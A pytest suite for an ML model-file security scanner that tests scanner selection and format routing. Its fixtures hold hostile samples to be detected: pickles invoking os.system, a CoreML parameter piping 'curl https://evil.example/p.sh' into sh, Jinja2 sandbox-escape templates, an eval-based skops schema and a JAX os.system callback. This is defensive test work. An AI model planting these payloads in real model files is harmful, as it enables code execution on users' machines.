"""Scanner selection policy and routing regressions."""

from __future__ import annotations

import base64
import binascii
import json
import os
import pickle
import zipfile
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
from click.testing import CliRunner

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.cli import cli
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.scanner_registry_metadata import get_scanner_registry_metadata
from modelaudit.scanner_selection import (
    allows_zip_content_analysis,
    allows_zip_structure_analysis,
    collect_suppressed_preferred_scanners,
    normalize_scanner_selection_config,
    policy_from_config,
    resolve_scanner_ids,
    resolve_scanner_selection_policy,
    scanner_catalog,
    scanner_ids_for_detected_format,
    selected_scanner_extensions,
    selected_scanner_filenames,
)
from modelaudit.scanners.archive_dispatch import scan_nested_file
from modelaudit.scanners.base import LOGICAL_SCAN_PATH_CONFIG_KEY, CheckStatus, IssueSeverity
from modelaudit.utils.file.detection import (
    _LEGAL_TEXT_ROUTE_MAX_BYTES,
    LLAMAFILE_ROUTE_SCAN_BYTES,
    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    PICKLE_ROUTING_INCONCLUSIVE_FORMAT,
)
from modelaudit.utils.sources.cloud_storage import filter_scannable_files as filter_cloud_scannable_files
from modelaudit.utils.sources.jfrog import filter_scannable_files as filter_jfrog_scannable_files
from tests.helpers import (
    create_mock_coreml,
    create_mock_onnx,
    create_mock_pytorch_zip,
    prefix_mock_onnx_with_unknown_field,
)


def _build_malicious_pickle() -> bytes:
    """Build a deterministic pickle payload with an unsafe reducer target."""

    class DangerousPayload:
        def __reduce__(self) -> tuple[Any, tuple[str]]:
            return (os.system, ("echo scanner-selection-test",))

    return pickle.dumps(DangerousPayload())


def _long_embedded_protocol0_pickle_in_legal_text() -> bytes:
    return (
        b"MIT License\nCopyright (c) Example\nRights are hereby granted.\n"
        + b"cposix\nsystem\n(S'"
        + (b"id #" + b"A" * 70000)
        + b"'\ntR."
    )


def _long_global_operand_in_legal_text() -> bytes:
    return b"MIT License\n" + b"c" + (b"a" * 70000) + b"\nx\n."


def _long_binpersid_lookbehind_in_legal_text() -> bytes:
    return b"Apache License\nS'" + (b"a" * 70000) + b"'\nQApache License\n"


def _long_context_opcode_prose() -> bytes:
    return b"Apache License\nSoftware " + (b"A" * 70000) + b"\nQuality terms apply.\n"


def _encoded_pickle_after_benign_candidate_budget(word: bytes = b"license") -> bytes:
    return b"MIT License\n" + ((word + b" ") * 4096) + b"\n" + base64.b64encode(b"cb\nx\n.")


def _overlapping_global_candidate_in_legal_text() -> bytes:
    return b"MIT License\n# comment\ncposix\nsystem\n(S'id'\ntR."


def _oversized_encoded_execution_after_probe() -> bytes:
    return b"MIT License\n" + base64.b64encode((b"A" * (1024 * 1024 + 1)) + b"eval(")


def _large_zero_fill_base64_legal_text() -> bytes:
    return b"MIT License " + (b"A" * 1_468_008)


def _wrap_encoded_lines(payload: bytes, width: int) -> bytes:
    return b"\n".join(payload[offset : offset + width] for offset in range(0, len(payload), width))


def _malicious_lightgbm_legal_payload() -> bytes:
    return (
        b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
        b"feature_names=f0 f1 f2\nfeature_infos=[0:1] [0:1] [0:1]\ntree_sizes=12\n"
        b"Tree=0\nnum_leaves=2\nsplit_feature=0\nsplit_gain=1.0\nthreshold=0.5\n"
        b"decision_type=<=\nleft_child=-1\nright_child=-2\nleaf_value=0.1 0.2\n"
        b"legal=MIT License\nmetadata=os.system('id')\n"
    )


def _xgboost_json_legal_payload() -> bytes:
    return json.dumps(
        {
            "version": [1, 7, 4],
            "learner": {"gradient_booster": {"model": {"trees": ["invalid"]}}},
            "metadata": "os.system('id')",
        }
    ).encode()


def _over_budget_legal_payload(leading: bytes, trailing: bytes = b"") -> bytes:
    return leading + (b"A" * (_LEGAL_TEXT_ROUTE_MAX_BYTES + 1 - len(leading))) + trailing


def _build_malicious_skops_schema() -> bytes:
    return (
        b'{"__loader__": "OperatorFuncNode", "__module__": "builtins", "__class__": "eval", '
        b'"_skops_version": "0.11.0", "content": {}}'
    )


def _has_pickle_execution_finding(result: Any) -> bool:
    for issue in result.issues:
        issue_text = f"{issue.message} {issue.details}".lower()
        if issue.rule_code == "S201" or "os.system" in issue_text or "eval" in issue_text:
            return True
    return False


def _assert_incomplete_pickle_routing(result: Any, path: Path) -> None:
    assert result.success is False
    assert result.scanner_name == "unknown"
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["scan_outcome_reasons"] == ["pickle_routing_incomplete"]
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "pickle_routing_incomplete"
    routing_checks = [check for check in result.checks if check.name == "Pickle Routing"]
    assert len(routing_checks) == 1
    check = routing_checks[0]
    assert check.status == CheckStatus.FAILED
    assert check.severity == IssueSeverity.INFO
    assert check.message == "Pickle routing was inconclusive because the bounded structural probe reached its limit"
    assert check.location == str(path)
    assert check.details == {
        "format": PICKLE_ROUTING_INCONCLUSIVE_FORMAT,
        "path": str(path),
    }


def _write_basic_openvino_xml(path: Path) -> Path:
    path.write_text(
        "<net name='test' version='10'><layers><layer id='0' name='data' type='Input'/></layers></net>",
        encoding="utf-8",
    )
    return path


def test_scanner_name_resolution_accepts_ids_classes_and_common_aliases() -> None:
    assert resolve_scanner_ids(["pickle", "PickleScanner", "TensorflowSavedModelScanner", "H5Scanner"]) == (
        "pickle",
        "tf_savedmodel",
        "keras_h5",
    )


def test_hardcoded_user_facing_aliases_resolve() -> None:
    """Pin the issue-facing aliases so class renames can't silently break selection."""
    cases = {
        "H5Scanner": "keras_h5",
        "TensorflowSavedModelScanner": "tf_savedmodel",
        "TensorFlowSavedModelScanner": "tf_savedmodel",
        "TensorflowMetaGraphScanner": "tf_metagraph",
        "TensorFlowMetaGraphScanner": "tf_metagraph",
    }
    for alias, expected_id in cases.items():
        assert resolve_scanner_ids([alias]) == (expected_id,), f"alias {alias!r} failed to resolve"


def test_every_registered_scanner_resolves_by_id_and_class() -> None:
    metadata = get_scanner_registry_metadata()

    for scanner_id, scanner_info in metadata.items():
        assert resolve_scanner_ids([scanner_id]) == (scanner_id,)
        assert resolve_scanner_ids([str(scanner_info["class"])]) == (scanner_id,)


def test_selection_policy_uses_allowlist_minus_exclusions() -> None:
    policy = resolve_scanner_selection_policy(
        scanners=["PickleScanner", "zip"],
        exclude_scanners=["ZipScanner"],
    )

    assert policy.active
    assert policy.enabled_scanner_ids == frozenset({"pickle"})
    assert policy.allows("pickle")
    assert not policy.allows("zip")


def test_zip_structure_analysis_honors_explicit_zip_exclusion() -> None:
    policy = resolve_scanner_selection_policy(exclude_scanners=["zip"])

    assert allows_zip_structure_analysis(policy, "archive.zip") is False


def test_zip_content_analysis_requires_a_content_owner() -> None:
    extension_analyzer = resolve_scanner_selection_policy(scanners=["weight_distribution"])
    subtype_owner = resolve_scanner_selection_policy(scanners=["pytorch_zip"])
    excluded_container = resolve_scanner_selection_policy(
        scanners=["pytorch_zip"],
        exclude_scanners=["zip"],
    )

    assert allows_zip_structure_analysis(extension_analyzer, "model.h5") is True
    assert allows_zip_content_analysis(extension_analyzer) is False
    assert allows_zip_content_analysis(subtype_owner) is True
    assert allows_zip_content_analysis(excluded_container) is False


def test_normalize_scanner_selection_config_reuses_normalized_payload(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    config = normalize_scanner_selection_config(
        {
            "scanners": ["pickle"],
            "exclude_scanners": ["zip"],
            "cache_enabled": False,
        }
    )

    def fail_policy_resolution(_: object) -> None:
        raise AssertionError("already normalized config should not resolve policy again")

    monkeypatch.setattr("modelaudit.scanner_selection.policy_from_config", fail_policy_resolution)

    assert normalize_scanner_selection_config(config) == config


def test_selection_policy_reuses_normalized_cached_results() -> None:
    list_policy = resolve_scanner_selection_policy(
        scanners=["pickle", "zip"],
        exclude_scanners=["zip"],
    )
    comma_policy = resolve_scanner_selection_policy(
        scanners="pickle,zip",
        exclude_scanners="zip",
    )

    assert list_policy is comma_policy


def test_normalized_selection_rehydrates_without_alias_resolution(monkeypatch: pytest.MonkeyPatch) -> None:
    config = normalize_scanner_selection_config({"scanners": ["PickleScanner"], "exclude_scanners": ["zip"]})

    def fail_resolve(*args: Any, **kwargs: Any) -> Any:
        raise AssertionError("normalized selection should not re-resolve aliases")

    monkeypatch.setattr("modelaudit.scanner_selection.resolve_scanner_selection_policy", fail_resolve)

    policy = policy_from_config(config)

    assert policy.active
    assert policy.enabled_scanner_ids == frozenset({"pickle"})
    assert policy.exact_scanner_ids == frozenset({"pickle"})
    assert policy.exclude_scanner_ids == frozenset({"zip"})


def test_normalized_selection_rejects_payloads_that_disable_every_scanner() -> None:
    all_scanner_ids = sorted(get_scanner_registry_metadata())
    config = {
        "scanner_selection": {
            "active": True,
            "scanners": None,
            "exclude_scanners": all_scanner_ids,
            "enabled_scanner_ids": [],
        }
    }

    with pytest.raises(ValueError, match="Scanner selection does not enable any scanners"):
        policy_from_config(config)


def test_normalize_scanner_selection_config_rejects_invalid_normalized_payload() -> None:
    all_scanner_ids = sorted(get_scanner_registry_metadata())
    config = {
        "scanner_selection": {
            "active": True,
            "scanners": None,
            "exclude_scanners": all_scanner_ids,
            "enabled_scanner_ids": [],
        }
    }

    with pytest.raises(ValueError, match="Scanner selection does not enable any scanners"):
        normalize_scanner_selection_config(config)


def test_scan_file_exact_scanner_allows_pickle_detection(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    result = scan_file(str(path), config={"scanners": ["PickleScanner"], "cache_enabled": False})

    assert result.scanner_name == "pickle"
    assert _has_pickle_execution_finding(result)


def test_scan_file_excluded_scanner_is_explicit_skip(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    result = scan_file(str(path), config={"exclude_scanners": ["pickle"], "cache_enabled": False})

    assert result.scanner_name == "scanner_selection"
    assert result.success
    assert not result.issues
    assert any(check.name == "Scanner Selection" for check in result.checks)
    assert result.metadata["skipped_scanner_id"] == "pickle"


def test_selected_coreml_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
    model_path = create_mock_coreml(
        tmp_path / "candidate.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())

    result = scan_file(str(model_path), config={"scanners": ["coreml"], "cache_enabled": False})

    assert result.scanner_name == "coreml"
    assert result.success is False
    assert any("Custom CoreML layer detected" in issue.message for issue in result.issues)


def test_nested_selected_coreml_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
    model_path = create_mock_coreml(
        tmp_path / "nested-candidate.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())

    result = scan_nested_file(str(model_path), config={"scanners": ["coreml"], "cache_enabled": False})

    assert result.scanner_name == "coreml"
    assert result.success is False
    assert any("Custom CoreML layer detected" in issue.message for issue in result.issues)


def test_excluded_coreml_scanner_is_not_run_for_renamed_candidate(tmp_path: Path) -> None:
    model_path = create_mock_coreml(
        tmp_path / "excluded-candidate.jpg",
        custom_class="EvilRuntimeLayer",
        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
    )
    model_path.write_bytes(b"\x08\x08" + (b"\x9a\x06\x00" * 4097) + model_path.read_bytes())

    result = scan_file(str(model_path), config={"exclude_scanners": ["coreml"], "cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert not any("Custom CoreML layer detected" in issue.message for issue in result.issues)


def test_selected_onnx_scanner_analyzes_budget_exhausted_renamed_candidate(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    model_path = create_mock_onnx(tmp_path / "candidate.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=8)

    result = scan_file(str(model_path), config={"scanners": ["onnx"], "cache_enabled": False})

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)


def test_excluded_onnx_scanner_is_not_run_for_renamed_candidate(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    model_path = create_mock_onnx(tmp_path / "excluded-candidate.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=8)

    result = scan_file(str(model_path), config={"exclude_scanners": ["onnx"], "cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)


def test_collect_suppressed_preferred_scanners_derives_from_checks(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    result = scan_file(str(path), config={"exclude_scanners": ["pickle"], "cache_enabled": False})

    suppressions = collect_suppressed_preferred_scanners(result.checks)
    assert suppressions
    assert {entry["scanner_id"] for entry in suppressions} == {"pickle"}
    assert all(entry["location"] == str(path) for entry in suppressions)


def test_preferred_scanner_skip_is_warning_and_tracks_suppressed_ids(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    result = scan_file(str(path), config={"exclude_scanners": ["pickle"], "cache_enabled": False})

    from modelaudit.scanner_results import IssueSeverity

    selection_checks = [c for c in result.checks if c.name == "Scanner Selection"]
    assert selection_checks, "expected preferred-scanner skip to emit a Scanner Selection check"
    assert any(c.severity == IssueSeverity.WARNING for c in selection_checks)
    assert any(
        c.details.get("kind") == "preferred" and c.details.get("skipped_scanner_id") == "pickle"
        for c in selection_checks
    )


def test_cli_warns_on_preferred_scanner_suppression(tmp_path: Path) -> None:
    path = tmp_path / "payload.pkl"
    path.write_bytes(_build_malicious_pickle())

    runner = CliRunner()
    result = runner.invoke(
        cli,
        [
            "scan",
            str(path),
            "--exclude-scanner",
            "pickle",
            "--format",
            "json",
            "--no-cache",
            "--quiet",
        ],
        env={"PROMPTFOO_DISABLE_TELEMETRY": "1"},
    )

    assert result.exit_code == 0
    assert "scanner selection suppressed the preferred scanner" in result.stderr.lower()
    output = json.loads(result.stdout)
    assert "pickle" in (output.get("scanner_selection") or {}).get("suppressed_preferred_scanner_ids", [])


def test_nested_archive_dispatch_honors_selection_policy(tmp_path: Path) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())

    zip_only = scan_file(str(archive_path), config={"scanners": ["zip"], "cache_enabled": False})
    assert zip_only.scanner_name == "zip"
    assert not _has_pickle_execution_finding(zip_only)
    assert any(check.name == "Scanner Selection" for check in zip_only.checks)

    zip_and_pickle = scan_file(
        str(archive_path),
        config={"scanners": ["zip", "pickle"], "cache_enabled": False},
    )
    assert zip_and_pickle.scanner_name == "zip"
    assert _has_pickle_execution_finding(zip_and_pickle)


def test_llamafile_zip_polyglot_honors_embedded_container_selection_policy(tmp_path: Path) -> None:
    archive_path = tmp_path / "payload.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())
    archive_path.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + archive_path.read_bytes())

    llamafile_only = scan_file(str(archive_path), config={"scanners": ["llamafile"], "cache_enabled": False})
    assert llamafile_only.scanner_name == "llamafile"
    assert not _has_pickle_execution_finding(llamafile_only)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in llamafile_only.checks
    )

    with_nested_scan = scan_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "pickle"], "cache_enabled": False},
    )
    assert with_nested_scan.scanner_name == "llamafile"
    assert _has_pickle_execution_finding(with_nested_scan)


def test_inconclusive_llamafile_zip_route_honors_container_selection_policy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "payload.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())
    archive_path.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + archive_path.read_bytes())

    def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
        raise OSError("synthetic marker probe failure")

    monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)

    llamafile_only = scan_file(str(archive_path), config={"scanners": ["llamafile"], "cache_enabled": False})
    assert not _has_pickle_execution_finding(llamafile_only)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in llamafile_only.checks
    )

    with_nested_scan = scan_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "pickle"], "cache_enabled": False},
    )
    assert _has_pickle_execution_finding(with_nested_scan)

    nested_llamafile_only = scan_nested_file(
        str(archive_path),
        config={"scanners": ["llamafile"], "cache_enabled": False},
    )
    assert not _has_pickle_execution_finding(nested_llamafile_only)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in nested_llamafile_only.checks
    )

    nested_with_container_scan = scan_nested_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "pickle"], "cache_enabled": False},
    )
    assert _has_pickle_execution_finding(nested_with_container_scan)


def test_llamafile_skops_polyglot_honors_subtype_selection_policy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "skops-cve.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("schema.json", _build_malicious_skops_schema())
    archive_path.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + archive_path.read_bytes())

    without_skops = scan_file(str(archive_path), config={"scanners": ["llamafile", "zip"], "cache_enabled": False})
    assert not any(check.name == "CVE-2025-54412 Detection" for check in without_skops.checks)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "skops"
        for check in without_skops.checks
    )

    with_skops = scan_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "skops"], "cache_enabled": False},
    )
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in with_skops.checks
    )

    nested_with_skops = scan_nested_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "skops"], "cache_enabled": False},
    )
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
        for check in nested_with_skops.checks
    )

    def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
        raise OSError("synthetic marker probe failure")

    monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)

    inconclusive_with_skops = scan_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "skops"], "cache_enabled": False},
    )
    assert inconclusive_with_skops.metadata["scan_outcome"] == "inconclusive"
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
        for check in inconclusive_with_skops.checks
    )

    nested_inconclusive_with_skops = scan_nested_file(
        str(archive_path),
        config={"scanners": ["llamafile", "zip", "skops"], "cache_enabled": False},
    )
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
        for check in nested_inconclusive_with_skops.checks
    )


def test_executable_zip_runs_all_matching_enabled_subtypes(tmp_path: Path) -> None:
    archive_path = tmp_path / "multi-subtype.jpg"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", pickle.dumps({"safe": True}))
        archive.writestr("archive/version", b"1.6")
        archive.writestr("schema.json", _build_malicious_skops_schema())
    archive_path.write_bytes(
        b"\x7fELF"
        + b"\x00" * 60
        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
        + b"llamafile runtime"
        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
        + archive_path.read_bytes()
    )

    result = scan_file(
        str(archive_path),
        config={"scanners": ["zip", "pytorch_zip", "skops"], "cache_enabled": False},
    )

    assert result.scanner_name == "zip"
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )

    nested_result = scan_nested_file(
        str(archive_path),
        config={"scanners": ["zip", "pytorch_zip", "skops"], "cache_enabled": False},
    )
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
        for check in nested_result.checks
    )


def test_selected_zip_scanner_handles_zip_backed_extension_fallback(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    result = scan_file(str(model_path), config={"scanners": ["zip"], "cache_enabled": False})

    assert result.scanner_name == "zip"
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pytorch_zip"
        for check in result.checks
    )


def test_nested_selected_zip_scanner_handles_zip_backed_extension_fallback(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    result = scan_nested_file(str(model_path), config={"scanners": ["zip"], "cache_enabled": False})

    assert result.scanner_name == "zip"
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pytorch_zip"
        for check in result.checks
    )


def test_nested_ambiguous_jax_legal_member_preserves_model_ownership(tmp_path: Path) -> None:
    extracted_member = tmp_path / "member"
    extracted_member.write_bytes(b'{"license":"MIT","value":' + (b"9" * 5000) + b',"framework":"jax"}')

    result = scan_nested_file(
        str(extracted_member),
        config={"cache_enabled": False, LOGICAL_SCAN_PATH_CONFIG_KEY: "LICENSE"},
    )

    assert result.scanner_name == "jax_checkpoint"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["scan_outcome_reasons"] == ["jax_json_scan_failed"]


def test_nested_physical_license_with_mxnet_structure_preserves_model_ownership(tmp_path: Path) -> None:
    extracted_member = tmp_path / "LICENSE"
    extracted_member.write_text(
        '{"license":"MIT","nodes":[{"op":"null","name":"data","inputs":[]}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert result.success is True
    assert result.metadata["node_count"] == 1


def test_nested_legal_tokenizer_template_preserves_jinja_ownership(tmp_path: Path) -> None:
    extracted_member = tmp_path / "member"
    extracted_member.write_bytes(
        b'{"license":"MIT","chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"}'
    )

    result = scan_nested_file(
        str(extracted_member),
        config={"cache_enabled": False, LOGICAL_SCAN_PATH_CONFIG_KEY: "LICENSE"},
    )

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_nested_legal_jax_template_overlap_preserves_both_analyses(tmp_path: Path) -> None:
    extracted_member = tmp_path / "member"
    extracted_member.write_bytes(
        b'{"license":"MIT","chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        b'"framework":"jax","orbax_version":"0.1.0",'
        b'"payload":"jax.experimental.host_callback.call(os.system, \'id\')"}'
    )

    result = scan_nested_file(
        str(extracted_member),
        config={"cache_enabled": False, LOGICAL_SCAN_PATH_CONFIG_KEY: "LICENSE"},
    )

    assert result.scanner_name == "jax_checkpoint"
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_nested_selected_jinja_scanner_handles_legal_jax_template_overlap(tmp_path: Path) -> None:
    extracted_member = tmp_path / "member"
    extracted_member.write_bytes(
        b'{"license":"MIT","chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        b'"framework":"jax","orbax_version":"0.1.0"}'
    )

    result = scan_nested_file(
        str(extracted_member),
        config={
            "scanners": ["jinja2_template"],
            "cache_enabled": False,
            LOGICAL_SCAN_PATH_CONFIG_KEY: "LICENSE",
        },
    )

    assert result.scanner_name == "jinja2_template"
    assert "jax_checkpoint" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_selected_jinja_scanner_handles_legal_jax_template_overlap(tmp_path: Path) -> None:
    license_path = tmp_path / "LICENSE"
    license_path.write_bytes(
        b'{"license":"MIT","chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        b'"framework":"jax","orbax_version":"0.1.0",'
        b'"payload":"jax.experimental.host_callback.call(os.system, \'id\')"}'
    )

    result = scan_file(
        str(license_path),
        config={"scanners": ["jinja2_template"], "cache_enabled": False},
    )

    assert result.scanner_name == "jinja2_template"
    assert result.metadata["scanner_dependency_ids"] == ["jinja2_template"]
    assert "jax_checkpoint" in result.metadata["skipped_scanner_ids"]
    assert {entry["scanner_id"] for entry in collect_suppressed_preferred_scanners(result.checks)} == {"jax_checkpoint"}
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_selected_jinja_scanner_handles_legal_xgboost_template_overlap(tmp_path: Path) -> None:
    license_path = tmp_path / "LICENSE"
    license_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"}'
    )

    result = scan_file(
        str(license_path),
        config={"scanners": ["jinja2_template"], "cache_enabled": False},
    )

    assert result.scanner_name == "jinja2_template"
    assert result.metadata["scanner_dependency_ids"] == ["jinja2_template"]
    assert "xgboost" in result.metadata["skipped_scanner_ids"]
    assert {entry["scanner_id"] for entry in collect_suppressed_preferred_scanners(result.checks)} == {"xgboost"}
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_nested_selected_jinja_scanner_handles_legal_xgboost_template_overlap(tmp_path: Path) -> None:
    extracted_member = tmp_path / "member"
    extracted_member.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"}'
    )

    result = scan_nested_file(
        str(extracted_member),
        config={
            "scanners": ["jinja2_template"],
            "cache_enabled": False,
            LOGICAL_SCAN_PATH_CONFIG_KEY: "NOTICE",
        },
    )

    assert result.scanner_name == "jinja2_template"
    assert "xgboost" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_embedded_pickle_helpers_honor_selection_policy(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", malicious=True)

    pytorch_only = scan_file(str(model_path), config={"scanners": ["pytorch_zip"], "cache_enabled": False})
    assert pytorch_only.scanner_name == "pytorch_zip"
    assert not _has_pickle_execution_finding(pytorch_only)
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pickle"
        for check in pytorch_only.checks
    )

    pytorch_and_pickle = scan_file(
        str(model_path),
        config={"scanners": ["pytorch_zip", "pickle"], "cache_enabled": False},
    )
    assert pytorch_and_pickle.scanner_name == "pytorch_zip"
    assert _has_pickle_execution_finding(pytorch_and_pickle)


def test_directory_scan_preserves_executable_openvino_bin_sidecar_route(tmp_path: Path) -> None:
    xml_path = _write_basic_openvino_xml(tmp_path / "model.xml")
    bin_path = create_mock_pytorch_zip(tmp_path / "model.bin", malicious=True)

    result = scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)

    assert result.files_scanned == 2
    assert "openvino" in result.scanner_names
    assert "pytorch_zip" in result.scanner_names
    assert result.file_metadata[str(xml_path)]["bin_size"] == bin_path.stat().st_size
    assert _has_pickle_execution_finding(result)
    assert any(issue.location and str(bin_path) in issue.location for issue in result.issues)


def test_directory_scan_preserves_legitimate_openvino_sidecar_accounting(tmp_path: Path) -> None:
    xml_path = _write_basic_openvino_xml(tmp_path / "model.xml")
    bin_path = tmp_path / "model.bin"
    bin_path.write_bytes(b"\x00" * 10)

    result = scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)

    assert result.files_scanned == 2
    assert result.scanner_names == ["openvino"]
    assert result.bytes_scanned == xml_path.stat().st_size + bin_path.stat().st_size
    assert result.file_metadata[str(xml_path)]["bin_size"] == bin_path.stat().st_size


def test_directory_scan_preserves_selected_text_scanner_skip_extensions(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    result = scan_model_directory_or_file(
        str(tmp_path),
        scanners=["text"],
        cache_enabled=False,
        skip_file_types=True,
    )

    assert result.files_scanned == 1
    assert result.scanner_names == ["text"]
    assert result.scanner_selection
    assert result.scanner_selection["enabled_scanner_ids"] == ["text"]


def test_scan_file_keeps_malicious_pickle_named_license_on_pickle_route(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(b'cposix\nsystem\n(S"echo pwned"\ntR.')

    result = scan_file(str(path), config={"cache_enabled": False})

    assert result.scanner_name == "pickle"
    assert _has_pickle_execution_finding(result)


def test_scan_file_keeps_ordinary_copyright_notice_on_text_route(tmp_path: Path) -> None:
    path = tmp_path / "LICENSE"
    path.write_bytes(b"Legal notice.\nMIT License\nRights are hereby granted.\n")

    result = scan_model_directory_or_file(str(path), cache_enabled=False)

    assert result.scanner_names == ["text"]
    assert determine_exit_code(result) == 0


